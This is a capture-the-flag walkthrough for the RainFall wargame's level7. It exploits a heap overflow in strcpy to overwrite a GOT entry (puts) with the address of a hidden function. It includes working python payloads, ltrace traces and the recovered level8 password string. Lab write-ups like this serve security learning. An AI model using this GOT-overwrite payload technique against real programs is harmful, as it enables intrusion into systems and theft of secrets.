Ok so in this one we can see a uncalled function, m
This function prints a string c and an int that it get from time syscall
We should try and call that function

The main function copies arg0 and arg1 into size 8 mallocd buffers.

We cannot break anything before the fopen and fgets have been done properly, so my guess is that we should attack the puts call, since it's an external function

The fgets function address is located at 0x08049918, so we should try writing here

M function address is 0x080484f4 , so the goal is writing M address at fgets address 

Since heap grows up and stack grows down, during the first strcpy we should be able to go over the malloced buffer and into the stack, in order to reach the second strcpy target address, so by padding our 1st buffer, then adding fgets fun address and giving the M address as our second arg, it should copy the M function at the location of the fgets address, and when we call fgets we actually call M

Also this one is pretty annoying since we cannot see it run in gdb, as the fopen syscall will always fail and then crash the fgets, no gdb then..

While ltrace still doesnt help us we can at least see if we hit the good memory zone

python -c 'print("a" * 8 + "\x18\x99\x04\x08")'


if we do : 
```bash
ltrace ./level7 $(python -c 'print("a" * 100 + "\x18\x99\x04\x08")') b
__libc_start_main(0x8048521, 3, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                               = 0x0804a008
malloc(8)                                               = 0x0804a018
malloc(8)                                               = 0x0804a028
malloc(8)                                               = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...) = 0x0804a018
strcpy(0x61616161, "b" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

So we can see that our second strcpy has been overwritten by 61, so our a, theory seems to work, now to find the proper bound

There is 4 mallocs 8 getting called


```bash
level7@RainFall:~$ ltrace ./level7 aaaa bbbb
__libc_start_main(0x8048521, 3, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                               = 0x0804a008
malloc(8)                                               = 0x0804a018
malloc(8)                                               = 0x0804a028
malloc(8)                                               = 0x0804a038
strcpy(0x0804a018, "aaaa")                              = 0x0804a018
strcpy(0x0804a038, "bbbb")                              = 0x0804a038
fopen("/home/user/level8/.pass", "r")                   = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We are starting at address 0x0804a018, which is the second malloc, so we need to go 3*8 ? 24 ?

```bash
level7@RainFall:~$ ltrace ./level7 $(python -c 'print("a" * 24 + "\x18\x99\x04\x08")') b
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                               = 0x0804a008
malloc(8)                                               = 0x0804a018
malloc(8)                                               = 0x0804a028
malloc(8)                                               = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaa\030\231\004\b") = 0x0804a018
strcpy(0x61616161, "b" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Still over, remove 4 for our address 

```bash
level7@RainFall:~$ ltrace ./level7 $(python -c 'print("a" * 20 + "\x18\x99\x04\x08")') b
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                               = 0x0804a008
malloc(8)                                               = 0x0804a018
malloc(8)                                               = 0x0804a028
malloc(8)                                               = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa\030\231\004\b") = 0x0804a018
strcpy(0x08049918, "b")                                 = 0x08049918
fopen("/home/user/level8/.pass", "r")                   = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Ok so now we have the correct address in place ! Nice, let's just add the m address in place of our second argument

$(python -c 'print("a" * 20 + "\x18\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")') 


```bash
level7@RainFall:~$ ltrace ./level7 $(python -c 'print("a" * 20 + "\x18\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                               = 0x0804a008
malloc(8)                                               = 0x0804a018
malloc(8)                                               = 0x0804a028
malloc(8)                                               = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa\030\231\004\b") = 0x0804a018
strcpy(0x08049918, "\364\204\004\b")                    = 0x08049918
fopen("/home/user/level8/.pass", "r")                   = 0
fgets( <unfinished ...>
time(NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Ok so now we can see that the time function is called, which is what we wanted !

But it should be after fgets, we overrid the wrong pointer, it's not fgets but puts that we need to attack, my bad, it's at 0x08049928

$(python -c 'print("a" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")') 

```bash
level7@RainFall:~$ ltrace ./level7 $(python -c 'print("a" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                               = 0x0804a008
malloc(8)                                               = 0x0804a018
malloc(8)                                               = 0x0804a028
malloc(8)                                               = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa(\231\004\b")   = 0x0804a018
strcpy(0x08049928, "\364\204\004\b")                    = 0x08049928
fopen("/home/user/level8/.pass", "r")                   = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Still crashes but it crashes at the fgets, it should be fine i guess

```bash
level7@RainFall:~$ ./level7 $(python -c 'print("a" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1709401707
level7@RainFall:~$
```
got it